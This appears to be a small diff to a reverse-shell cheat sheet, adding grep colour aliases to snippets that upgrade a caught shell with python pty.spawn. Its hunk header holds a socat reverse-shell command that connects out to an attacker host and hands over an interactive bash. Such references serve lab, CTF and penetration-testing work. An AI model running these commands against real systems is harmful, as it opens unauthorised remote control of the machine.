@@ -45,12 +45,14 @@ socat TCP:me:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 alias ls='ls --color=auto'
+alias grep='grep --color=auto'
 export TERM=xterm
 ```
 
 ```shell
 python -c 'import pty;pty.spawn("/bin/bash")'
 alias ls='ls --color=auto'
+alias grep='grep --color=auto'
 export TERM=xterm
 ```
 
